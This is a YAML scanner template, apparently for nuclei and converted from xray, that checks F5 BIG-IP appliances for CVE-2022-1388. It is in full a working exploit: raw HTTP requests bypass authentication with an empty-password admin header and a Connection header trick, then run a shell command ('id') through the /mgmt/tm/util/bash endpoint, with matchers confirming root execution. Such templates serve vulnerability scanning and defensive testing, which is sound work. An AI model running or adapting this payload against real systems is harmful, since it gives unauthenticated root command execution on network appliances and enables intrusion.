id: poc-yaml-f5-big-ip-cve-2022-1388-rce

info:
  name: poc-yaml-f5-big-ip-cve-2022-1388-rce
  author: Aurora
  severity: critical
  tags: xray-converted,rce,cve-2022-1388,ct-424129
  reference:
    - https://support.f5.com/csp/article/K23605346

http:
  - raw:
      - |
        GET /mgmt/shared/diagnostics/device-stats HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic YWRtaW46
        Connection: X-Forwarded-Host,X-F5-Auth-Token
        Content-Type: application/json
        X-F5-Auth-Token: {{authToken}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "lastUpdateMicros"
  - raw:
      - |
        POST /mgmt/tm/util/bash HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic YWRtaW46
        Connection: X-Forwarded-Host,X-F5-Auth-Token
        Content-Type: application/json
        X-F5-Auth-Token: a

        {"command":"run","utilCmdArgs":"-c id"}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "commandResult"
          - "root"
      - type: regex
        part: body
        regex:
          - "(u|g)id=\\d+"